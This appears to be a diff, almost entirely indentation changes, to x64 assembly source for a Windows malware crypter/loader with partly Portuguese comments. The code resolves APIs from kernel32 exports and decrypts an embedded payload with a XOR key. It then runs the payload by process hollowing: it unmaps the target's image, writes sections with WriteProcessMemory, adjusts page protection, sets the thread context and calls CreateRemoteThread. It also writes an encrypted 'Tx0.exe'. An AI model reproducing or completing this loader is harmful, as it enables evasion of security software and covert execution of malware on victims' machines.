@@ -160,28 +160,28 @@ section vprotect
 
 	mov rcx, r10
 	kernel32findfunction4:  
-			jecxz FunctionNameFound4
-			xor ebx,ebx
-			mov ebx, [r11+4+rcx*4]
-			add rbx, r8
-			dec rcx
-			mov rax, 0x41636f7250746547
-			cmp [rbx], rax
-			jnz kernel32findfunction4; 
+		jecxz FunctionNameFound4
+		xor ebx,ebx
+		mov ebx, [r11+4+rcx*4]
+		add rbx, r8
+		dec rcx
+		mov rax, 0x41636f7250746547
+		cmp [rbx], rax
+		jnz kernel32findfunction4; 
 	
 	; Find GetProcessAddress
 	FunctionNameFound4:                 			
-			xor r11, r11; 
-			mov r11d, [rdx+0x24]
-			add r11, r8		
-			inc rcx; 
-			mov r13w, [r11+rcx*2]	
-			xor r11, r11; 
-			mov r11d, [rdx+0x1c]
-			add r11, r8 
-			mov eax, [r11+4+r13*4]
-			add rax, r8
-			mov r14, rax
+		xor r11, r11; 
+		mov r11d, [rdx+0x24]
+		add r11, r8		
+		inc rcx; 
+		mov r13w, [r11+rcx*2]	
+		xor r11, r11; 
+		mov r11d, [rdx+0x1c]
+		add r11, r8 
+		mov eax, [r11+4+r13*4]
+		add rax, r8
+		mov r14, rax
 
 		ImportTable:
 		mov rsi, ".rdata"
@@ -352,15 +352,15 @@ WinMain:
 		jne CopyTarget
 	
 	WriterCrypted:
-        ;Lookup fopen
-        mov rax, "fopen"
-        push rax
-        lea rdx, [rsp]
-        mov rcx, r15
-        sub rsp, 0x30
-        call r14
-        add rsp, 0x30
-        add rsp, 0x08
+	        ;Lookup fopen
+	        mov rax, "fopen"
+	        push rax
+	        lea rdx, [rsp]
+	        mov rcx, r15
+	        sub rsp, 0x30
+	        call r14
+	        add rsp, 0x30
+	        add rsp, 0x08
 
 		;Abre arquivo
 		mov rbx, "Tx0.exe"
@@ -390,26 +390,26 @@ WinMain:
 		add rbx, 0x28
 		mov [rbx], dword 0xC7000;0xC6000;0x04C4E000
 		
-        ;call fwrite
-        xor r8,R8
-        mov r8, [rel TamArqProgram]
-        mov edx, r8d
-        mov r9, rsi
-        mov r8d, 0x01
-        mov rcx, [rel addressCrypted]
-        sub rsp, 0x30
-        call rax
-        add rsp, 0x30
-        add rsp, 0x08
-        ;Lookup fclose
-        mov rax, "fclose"
-        push rax
-        lea rdx, [rsp]
-        mov rcx, r15
-        sub rsp, 0x30
-        call r14
-        add rsp, 0x30
-        add rsp, 0x08
+	        ;call fwrite
+	        xor r8,R8
+	        mov r8, [rel TamArqProgram]
+	        mov edx, r8d
+	        mov r9, rsi
+	        mov r8d, 0x01
+	        mov rcx, [rel addressCrypted]
+	        sub rsp, 0x30
+	        call rax
+	        add rsp, 0x30
+	        add rsp, 0x08
+	        ;Lookup fclose
+	        mov rax, "fclose"
+	        push rax
+	        lea rdx, [rsp]
+	        mov rcx, r15
+	        sub rsp, 0x30
+	        call r14
+	        add rsp, 0x30
+	        add rsp, 0x08
 		
 		;call fclose
 		sub rsp,0x30
@@ -419,21 +419,21 @@ WinMain:
 		add rsp, 0x08
 	   
 	Exit:   
-        call Locate_kernel32
-        ;lookup ExitProcess
-        mov rax, "ess"
-        push rax
-        mov rax, "ExitProc"
-        push rax
-        lea rdx, [rsp]
-        mov rcx, r8
-        sub rsp, 0x30
-        call r14
-        add rsp, 0x30
-        add rsp, 0x10
-        ;call ExitProcess
-        mov r12 ,rax
-        call r12
+	        call Locate_kernel32
+	        ;lookup ExitProcess
+	        mov rax, "ess"
+	        push rax
+	        mov rax, "ExitProc"
+	        push rax
+	        lea rdx, [rsp]
+	        mov rcx, r8
+	        sub rsp, 0x30
+	        call r14
+	        add rsp, 0x30
+	        add rsp, 0x10
+	        ;call ExitProcess
+	        mov r12 ,rax
+	        call r12
     ;END
 ret
 ;***************
@@ -724,7 +724,7 @@ decCode:
 		call r14
 		mov r12, rax
 		add rsp, 0x30
-
+	
 		;call OpenProcess
 		xor edx,edx
 		mov ecx, 0x2000000
@@ -735,119 +735,119 @@ decCode:
 		add rsp, 0x30
 		mov r13, rax
 	
-    call Locate_kernel32
-    call GetProcAddres
-	
-    ;Lookup VirtualAlloc
-    mov rax, "lloc"
-    push rax
-    mov rax, "VirtualA"
-    push rax
-    lea rdx, [rsp]
-    mov rcx, r8
-    sub rsp, 0x30
-    sub rsp, 0x10
-    call r14
-   
-    add rsp, 0x30
-    add rsp, 0x10
-    ;call VirtualAlloc
-    mov r9d, 0x04
-    mov r8d, 0x1000
-    mov rdi,   800000;80000000 
-    mov edx, edi
-    mov ecx, 0x00
-    call rax
-	mov [rel AddressAlocadoV], rax
-    mov rcx, [rel AddressAlocadoV]
-	mov rdx, CodeRed
-    mov r9, 800000;80000000 
-	sub r9, 0x07
-    DecArq:
-        mov rax, [rdx]
-        xor rax, 0xC0FFEE
-        sub rax, 0xc
-        mov [rcx],rax
-        inc rcx
-        inc rdx
-        dec r9
-        cmp r9, 0x00
-        jne DecArq
+		call Locate_kernel32
+		call GetProcAddres
+		
+		;Lookup VirtualAlloc
+		mov rax, "lloc"
+		push rax
+		mov rax, "VirtualA"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r8
+		sub rsp, 0x30
+		sub rsp, 0x10
+		call r14
+		
+		add rsp, 0x30
+		add rsp, 0x10
+		;call VirtualAlloc
+		mov r9d, 0x04
+		mov r8d, 0x1000
+		mov rdi,   800000;80000000 
+		mov edx, edi
+		mov ecx, 0x00
+		call rax
+		mov [rel AddressAlocadoV], rax
+		mov rcx, [rel AddressAlocadoV]
+		mov rdx, CodeRed
+		mov r9, 800000;80000000 
+		sub r9, 0x07
+	DecArq:
+		mov rax, [rdx]
+		xor rax, 0xC0FFEE
+		sub rax, 0xc
+		mov [rcx],rax
+		inc rcx
+		inc rdx
+		dec r9
+		cmp r9, 0x00
+		jne DecArq
 
-    mov rax, [rel AddressAlocadoV]
-    mov ebx, [rax+0x3C]
-    add rax, rbx
-    add rax, 0x50
-    mov ebx, [eax]
-    mov [rel GetSizeTarget],rbx
-¯   mov rax, [rel AddressAlocadoV]
-    mov [rel lpImageBase], rax 
-    mov edi,[rax+0x3c]
-    add eax, edi
-    mov [rel PE], rax
-    add rax, 0x30
-    mov rdi, [rax]
+	mov rax, [rel AddressAlocadoV]
+	mov ebx, [rax+0x3C]
+	add rax, rbx
+	add rax, 0x50
+	mov ebx, [eax]
+	mov [rel GetSizeTarget],rbx
+	¯   mov rax, [rel AddressAlocadoV]
+	mov [rel lpImageBase], rax 
+	mov edi,[rax+0x3c]
+	add eax, edi
+	mov [rel PE], rax
+	add rax, 0x30
+	mov rdi, [rax]
 	add rdi, 0x16f
-    mov [rel ImageBase], rdi
+	mov [rel ImageBase], rdi
 	
-    call Locate_kernel32
-    ;lookup GetThreadContext
-    call GetThreadCx
-    ;call GetThreadContext
-    mov dword[rel ctx+CONTEXT.ContextFlags], 0x100002 
-    mov rax, [rel ProcInfo+PROCESSINFO.hThread]
-    lea rdx, [rel ctx+CONTEXT.P1Home]
-    mov rcx, rax
-    call r12
-    ;Lookup ReadProcessMemory
-    call ReadProcessMemory
-    ;call ReadProcessMemory
-    mov rdi, [rel ctx+CONTEXT.Rdx]
-    mov edx, 0x10
-    add rdi,rdx
-    mov [rel void], rdi
-    mov rdx, [rel void]
-    lea rcx, [rel lpPebImageBase]
-    xor rdi,rdi
-    mov [rsp+0x20], rdi
-    mov r9d, 0x08
-    mov r8, Rcx
-    mov rcx,[rel ProcInfo+PROCESSINFO.hProcess]
-    call rax
+	call Locate_kernel32
+	;lookup GetThreadContext
+	call GetThreadCx
+	;call GetThreadContext
+	mov dword[rel ctx+CONTEXT.ContextFlags], 0x100002 
+	mov rax, [rel ProcInfo+PROCESSINFO.hThread]
+	lea rdx, [rel ctx+CONTEXT.P1Home]
+	mov rcx, rax
+	call r12
+	;Lookup ReadProcessMemory
+	call ReadProcessMemory
+	;call ReadProcessMemory
+	mov rdi, [rel ctx+CONTEXT.Rdx]
+	mov edx, 0x10
+	add rdi,rdx
+	mov [rel void], rdi
+	mov rdx, [rel void]
+	lea rcx, [rel lpPebImageBase]
+	xor rdi,rdi
+	mov [rsp+0x20], rdi
+	mov r9d, 0x08
+	mov r8, Rcx
+	mov rcx,[rel ProcInfo+PROCESSINFO.hProcess]
+	call rax
 	
-    mov rax, [rel lpImageBase]
-    xor rdi,rdi 
-    mov edi,[rax+0x3c]
-    add rax, rdi
-    mov [rel PE], rax
-    add rax, 0x38
-    xor rdi, rdi
-    mov edi, [rax]
-    mov [rel VA], eax
-    mov rax, [rel lpPebImageBase]
-    mov rdi , [rel ImageBase]
-    cmp rax,Rdi
-    jne lpAllocatedBase 
-    call Locate_ntdll
-    ;Lookup ZwUnmapViewOfSection
-    ;ZwUnmapViewOfSection
-    mov rax, "tion"
-    push Rax
-    mov rax, "iewOfSec"
-    push Rax
-    mov rax, "NtUnmapV"
-    push Rax
-    lea rdx, [rsp]
-    mov rcx, r8
-    sub rsp, 0x30
-    call r14 
-    mov r12, rax
-    add rsp, 0x30
-    add rsp, 0x10
-    ;call ZwUnmapViewOfSection
-    mov rcx, [rel ProcInfo+PROCESSINFO.hProcess]
-    mov rdx, [rel lpPebImageBase]
-    call rax
+	mov rax, [rel lpImageBase]
+	xor rdi,rdi 
+	mov edi,[rax+0x3c]
+	add rax, rdi
+	mov [rel PE], rax
+	add rax, 0x38
+	xor rdi, rdi
+	mov edi, [rax]
+	mov [rel VA], eax
+	mov rax, [rel lpPebImageBase]
+	mov rdi , [rel ImageBase]
+	cmp rax,Rdi
+	jne lpAllocatedBase 
+	call Locate_ntdll
+	;Lookup ZwUnmapViewOfSection
+	;ZwUnmapViewOfSection
+	mov rax, "tion"
+	push Rax
+	mov rax, "iewOfSec"
+	push Rax
+	mov rax, "NtUnmapV"
+	push Rax
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14 
+	mov r12, rax
+	add rsp, 0x30
+	add rsp, 0x10
+	;call ZwUnmapViewOfSection
+	mov rcx, [rel ProcInfo+PROCESSINFO.hProcess]
+	mov rdx, [rel lpPebImageBase]
+	call rax
     lpAllocatedBase: 
         call Locate_kernel32
         call LoadLibrary
@@ -910,280 +910,280 @@ decCode:
             add rsp, 0x08
 			
         Decisao1:
-			mov rax, [rel PE]
-			mov word[rax+0x5C], 2 ;Subsystem
-			mov rax, [rel ImageBase]
-			mov rdx, [rel ImageBase]
-			cmp rdx,Rax
-			je Writable
-			mov rax, [rel PE]
-			movzx eax, word[rax+0x16]
-			movzx eax, ax
-			and eax, 1
-			test eax,eax
-			je Pulo2
-            Pulo2:
+		mov rax, [rel PE]
+		mov word[rax+0x5C], 2 ;Subsystem
+		mov rax, [rel ImageBase]
+		mov rdx, [rel ImageBase]
+		cmp rdx,Rax
+		je Writable
+		mov rax, [rel PE]
+		movzx eax, word[rax+0x16]
+		movzx eax, ax
+		and eax, 1
+		test eax,eax
+		je Pulo2
+        Pulo2:
 		Writable:
-            call Locate_kernel32
-            mov rax,  [rel PE]
-            mov eax, [rax+0x28]
-            mov edx,eax
-            mov rax, [rel allocex]
-            add rax,rdx
-            ;mov[rel ctx+CONTEXT.Rcx], rax
-            call Locate_kernel32
-            call LoadLibrary
-            ;call LoadLibrary
-            mov r13, r15
-            ;Load kernelbase.dll
-            mov rax, "se.dll"     
-            push rax
-            mov rax, "kernelba"
-            push rax
-            mov rcx, rsp
-            sub rsp, 0x30
-            call rsi
-            mov r15,rax
-            add rsp, 0x30
-            add rsp, 0x10
-            call Locate_kernel32
-            ;lookup SetThreadContext
-            sub rsp, 0x80
-            mov rax, "dContext"
-            push Rax
-            mov rax, "SetThrea" 
-            push rax
-            mov [rsp+0x10], dword 0x00
-            lea rdx, [rsp]
-            mov rcx, r8
-            sub rsp, 0x30
-            call R14
-            add rsp,0x30
-            add rsp,0x10
-            add rsp, 0x80
-            mov r12, rax
-            ;call SetThreadContext
-            mov rax, [rel ProcInfo+PROCESSINFO.hThread]
-            lea rdx, [rel ctx+CONTEXT.P1Home]
-            mov rcx, Rax
-            call r12
+	            call Locate_kernel32
+	            mov rax,  [rel PE]
+	            mov eax, [rax+0x28]
+	            mov edx,eax
+	            mov rax, [rel allocex]
+	            add rax,rdx
+	            ;mov[rel ctx+CONTEXT.Rcx], rax
+	            call Locate_kernel32
+	            call LoadLibrary
+	            ;call LoadLibrary
+	            mov r13, r15
+	            ;Load kernelbase.dll
+	            mov rax, "se.dll"     
+	            push rax
+	            mov rax, "kernelba"
+	            push rax
+	            mov rcx, rsp
+	            sub rsp, 0x30
+	            call rsi
+	            mov r15,rax
+	            add rsp, 0x30
+	            add rsp, 0x10
+	            call Locate_kernel32
+	            ;lookup SetThreadContext
+	            sub rsp, 0x80
+	            mov rax, "dContext"
+	            push Rax
+	            mov rax, "SetThrea" 
+	            push rax
+	            mov [rsp+0x10], dword 0x00
+	            lea rdx, [rsp]
+	            mov rcx, r8
+	            sub rsp, 0x30
+	            call R14
+	            add rsp,0x30
+	            add rsp,0x10
+	            add rsp, 0x80
+	            mov r12, rax
+	            ;call SetThreadContext
+	            mov rax, [rel ProcInfo+PROCESSINFO.hThread]
+	            lea rdx, [rel ctx+CONTEXT.P1Home]
+	            mov rcx, Rax
+	            call r12
+					
+	            call Locate_kernel32
 				
-            call Locate_kernel32
-			
-            ;Lookup WriteProcess
-            call WriteProcess
-            ;call WriteProcessMemory
-            sub rsp, 0x80
-            mov rbx, [PE]  
-            mov r9d,[rbx+0x54]
-            mov r8, [rel lpImageBase]
-            mov rdx, [rel ImageBase]
-            xor rbx,Rbx
-            push rbx
-            mov [rsp+0x20],rsp
-            mov rcx, [rel ProcInfo+PROCESSINFO.hProcess]
-            call rax
-            add rsp, 0x80
-            mov rbp, rax
-            add rsp, 0x08
-            call Locate_kernel32
-			
-            ;Lookup VirtualProectEx
-            sub rsp, 0x80
-            call VirtualProectEx
-            mov rbx, [rel PE]
-            mov r8d, [rbx+0x54]
-            mov rdx, [rel ImageBase]
-            push Rcx
-            mov rcx,rsp
-            mov [rsp+0x20],Rcx
-            mov r9d, 0x40
-            mov rcx, [rel ProcInfo+PROCESSINFO.hProcess]
-            call r12
-            add rsp, 0x80
-            add rsp, 0x08
-            mov rax, [rel lpImageBase]
-            mov eax, [rax+0x3c]
-            movsxd rdx,eax
-            mov rax, [rel lpImageBase]
-            add rax,Rdx
-            add rax, 0x108
-            mov [rel Secao], rax
-            mov [rel NumSection], dword 0x00
-            jmp Final
+	            ;Lookup WriteProcess
+	            call WriteProcess
+	            ;call WriteProcessMemory
+	            sub rsp, 0x80
+	            mov rbx, [PE]  
+	            mov r9d,[rbx+0x54]
+	            mov r8, [rel lpImageBase]
+	            mov rdx, [rel ImageBase]
+	            xor rbx,Rbx
+	            push rbx
+	            mov [rsp+0x20],rsp
+	            mov rcx, [rel ProcInfo+PROCESSINFO.hProcess]
+	            call rax
+	            add rsp, 0x80
+	            mov rbp, rax
+	            add rsp, 0x08
+	            call Locate_kernel32
+				
+	            ;Lookup VirtualProectEx
+	            sub rsp, 0x80
+	            call VirtualProectEx
+	            mov rbx, [rel PE]
+	            mov r8d, [rbx+0x54]
+	            mov rdx, [rel ImageBase]
+	            push Rcx
+	            mov rcx,rsp
+	            mov [rsp+0x20],Rcx
+	            mov r9d, 0x40
+	            mov rcx, [rel ProcInfo+PROCESSINFO.hProcess]
+	            call r12
+	            add rsp, 0x80
+	            add rsp, 0x08
+	            mov rax, [rel lpImageBase]
+	            mov eax, [rax+0x3c]
+	            movsxd rdx,eax
+	            mov rax, [rel lpImageBase]
+	            add rax,Rdx
+	            add rax, 0x108
+	            mov [rel Secao], rax
+	            mov [rel NumSection], dword 0x00
+	            jmp Final
         
-		Realoc:
+	Realoc:
 			add rsp, 0x10	
-            call Locate_kernel32
-            ;Lookup WriteProcess
-            call WriteProcess
-            ;call WriteProcess
-            mov eax,[rel NumSection]
-            movsxd rdx,eax
-            mov rax, RDX
-            shl rax,0x2
-            add rax,Rdx
-            shl rax, 0x3
-            mov rdx, Rax
-            mov rax, [rel Secao]
-            add rax, Rdx
-            mov eax,[rax+0x10]
-            mov r9d,eax
-            mov eax,[rel NumSection]
-            movsxd rdx,eax
-            mov rax,Rdx
-            shl rax,0x2
-            add rax,Rdx
-            shl rax, 0x3
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax,Rdx
-            mov eax, [rax+0x14]
-            mov edx,eax
-            mov rax, [rel lpImageBase]
-            add rax,Rdx
-            mov r8, Rax
-            mov eax,[rel NumSection]
-            movsxd rdx, eax
-            mov rax, Rdx
-            shl rax, 0x2
-            add rax,Rdx
-            shl rax, 0x3
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax,Rdx
-            mov eax, [rax+0xc]
-            mov edx,eax
-            mov rax, [rel ImageBase]
-            add rax,Rdx
-            mov rcx,Rax
-            mov rax, [rel ProcInfo+PROCESSINFO.hProcess]
-            lea rdx, [rel Ptrl]
-            mov [rsp+0x20],rdx
-            mov rdx,Rcx
-            mov rcx, Rax
-	        sub rsp, 0x410
-            call R12
-            add rsp, 0x410
-	
-            mov dword[rel ptr17f0], 0
-            mov rax, [rel PE]
-            movzx eax, word[rax+0x6]
-            movzx eax, ax
-            sub eax, 0x01
-            cmp eax, [rel NumSection]
-            jne Decisao2
-            mov rax, [rel PE]
-            mov ecx, [rax+0x50]
-            mov eax, dword[rel NumSection]
-            movsxd rdx,eax
-            mov rax,rdx
-            shl rax, 0x02
-            add rax,Rdx
-            shl rax, 0x3
-            mov rdx, Rax
-            mov rax, [rel Secao]
-            add rax,Rdx
-            mov eax, dword [rax+0xc]
-            sub ecx,eax
-            mov eax,ecx
-            mov dword[rel NumSection], eax
-            jmp D4
-        Decisao2:
-            mov eax, dword[rel NumSection]
-            cdqe
-            lea rdx, [rax+1]
-            mov rax,Rdx
-            shl rax,0x02
-            add rax,Rdx
-            mov rax, [rel Secao]
-            add rax,Rdx
-            mov ecx, dword [rax+0xC]
-            mov eax, dword[rel NumSection]
-            movsxd rdx,eax
-            mov rax,Rdx
-            shl rax, 0x02
-            add rax,Rdx
-            shl rax,0x03
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax,Rdx
-            mov eax, dword[rax+0xc]
-            sub ecx,eax
-            mov eax, ecx
-            mov [rel ptr17f0], eax
-        D4:
-            mov dword [rel address7ec], 0
-            mov eax,[rel NumSection]
-            movsxd rdx,eax
-            mov rax,Rdx
-            shl rax, 0x02
-            add rax,Rdx
-            shl rax, 0x03
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax, Rdx
-            mov eax, [rax+0x24]
-            and eax,  0x20000000
-            test eax, eax 
-            je D5
-            mov eax, [rel NumSection]
-            movsxd rdx,eax
-            mov rax,Rdx
-            shl rax,0x02
-            add rax,Rdx
-            shl rax, 0x03
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax,rdx
-            mov eax, [rax+0x24]
-            and eax , 0x40000000
-            test eax,eax
-            je D5
-            mov eax, [rel NumSection]
-            movsxd rdx,eax
-            mov rax,Rdx
-            shl rax, 0x02
-            add rax,Rdx
-            shl rax, 0x03
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax,Rdx
-            mov eax,[rax+0x24]
-            test eax,eax
-            jns D5
-            mov dword[rel address7ec],0x40
-            jmp jmpAlloc
-        D5:
-            mov eax, [rel NumSection]
-            movsxd rdx,eax
-            mov rax,Rdx
-            shl rax, 0x02
-            add rax, Rdx
-            shl rax, 0x03
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax,Rdx
-            mov eax, [rax+0x24]
-            and eax, 0x20000000
-            test eax,eax
-            je D6
-            mov eax,[rel NumSection]
-            movsxd rdx,eax
-            mov rax,Rdx
-            shl rax, 0x02
-            add rax,Rdx
-            shl rax, 0x03
-            mov rdx,Rax
-            mov rax, [rel Secao]
-            add rax, Rdx
-            mov eax, [rax+0x24]
-            and eax, 0x40000000
-            test eax,eax
-            je D6
-            mov dword[rel address7ec],0x20
-            jmp jmpAlloc
-        D6:
+			call Locate_kernel32
+			;Lookup WriteProcess
+			call WriteProcess
+			;call WriteProcess
+			mov eax,[rel NumSection]
+			movsxd rdx,eax
+			mov rax, RDX
+			shl rax,0x2
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx, Rax
+			mov rax, [rel Secao]
+			add rax, Rdx
+			mov eax,[rax+0x10]
+			mov r9d,eax
+			mov eax,[rel NumSection]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax,0x2
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax,Rdx
+			mov eax, [rax+0x14]
+			mov edx,eax
+			mov rax, [rel lpImageBase]
+			add rax,Rdx
+			mov r8, Rax
+			mov eax,[rel NumSection]
+			movsxd rdx, eax
+			mov rax, Rdx
+			shl rax, 0x2
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax,Rdx
+			mov eax, [rax+0xc]
+			mov edx,eax
+			mov rax, [rel ImageBase]
+			add rax,Rdx
+			mov rcx,Rax
+			mov rax, [rel ProcInfo+PROCESSINFO.hProcess]
+			lea rdx, [rel Ptrl]
+			mov [rsp+0x20],rdx
+			mov rdx,Rcx
+			mov rcx, Rax
+			sub rsp, 0x410
+			call R12
+			add rsp, 0x410
+			
+			mov dword[rel ptr17f0], 0
+			mov rax, [rel PE]
+			movzx eax, word[rax+0x6]
+			movzx eax, ax
+			sub eax, 0x01
+			cmp eax, [rel NumSection]
+			jne Decisao2
+			mov rax, [rel PE]
+			mov ecx, [rax+0x50]
+			mov eax, dword[rel NumSection]
+			movsxd rdx,eax
+			mov rax,rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x3
+			mov rdx, Rax
+			mov rax, [rel Secao]
+			add rax,Rdx
+			mov eax, dword [rax+0xc]
+			sub ecx,eax
+			mov eax,ecx
+			mov dword[rel NumSection], eax
+			jmp D4
+		Decisao2:
+			mov eax, dword[rel NumSection]
+			cdqe
+			lea rdx, [rax+1]
+			mov rax,Rdx
+			shl rax,0x02
+			add rax,Rdx
+			mov rax, [rel Secao]
+			add rax,Rdx
+			mov ecx, dword [rax+0xC]
+			mov eax, dword[rel NumSection]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax,0x03
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax,Rdx
+			mov eax, dword[rax+0xc]
+			sub ecx,eax
+			mov eax, ecx
+			mov [rel ptr17f0], eax
+			D4:
+			mov dword [rel address7ec], 0
+			mov eax,[rel NumSection]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax, Rdx
+			mov eax, [rax+0x24]
+			and eax,  0x20000000
+			test eax, eax 
+			je D5
+			mov eax, [rel NumSection]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax,0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax,rdx
+			mov eax, [rax+0x24]
+			and eax , 0x40000000
+			test eax,eax
+			je D5
+			mov eax, [rel NumSection]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax,Rdx
+			mov eax,[rax+0x24]
+			test eax,eax
+			jns D5
+			mov dword[rel address7ec],0x40
+			jmp jmpAlloc
+		D5:
+			mov eax, [rel NumSection]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax, Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax,Rdx
+			mov eax, [rax+0x24]
+			and eax, 0x20000000
+			test eax,eax
+			je D6
+			mov eax,[rel NumSection]
+			movsxd rdx,eax
+			mov rax,Rdx
+			shl rax, 0x02
+			add rax,Rdx
+			shl rax, 0x03
+			mov rdx,Rax
+			mov rax, [rel Secao]
+			add rax, Rdx
+			mov eax, [rax+0x24]
+			and eax, 0x40000000
+			test eax,eax
+		je D6
+			mov dword[rel address7ec],0x20
+			jmp jmpAlloc
+		D6:
 			jmpAlloc:   
 			call Locate_kernel32
 			;Lookup VirtualProectEx
@@ -1205,7 +1205,7 @@ decCode:
 			jne RWC
 			mov r9d, 0x20
 			jmp Continue
-		RWC:
+			RWC:
 			cmp r9d, 0xC0500040
 			jne RW
 			mov r9d, 0x80
@@ -1241,13 +1241,13 @@ decCode:
 			sub rsp, 0x10
 			add rsp, 0x8
 			add dword [rel NumSection], 0x1
-		Final:
-			mov rax, [rel PE]
-			movzx eax, word[rax+0x06]
-			movzx eax, ax
-			cmp eax, [rel NumSection]   
-			jg Realoc
-			
+	Final:
+		mov rax, [rel PE]
+		movzx eax, word[rax+0x06]
+		movzx eax, ax
+		cmp eax, [rel NumSection]   
+		jg Realoc
+		
 		call Locate_kernel32
 		CreateRemoteThread:
 		;Lookup CreateRemoteThread
@@ -1263,7 +1263,7 @@ decCode:
 		call r14
 		add rsp, 0x30
 		mov r12,rax
-
+		
 		;call CreateRemoteThread
 		xor r15,r15
 		mov [rsp+0x30], r15
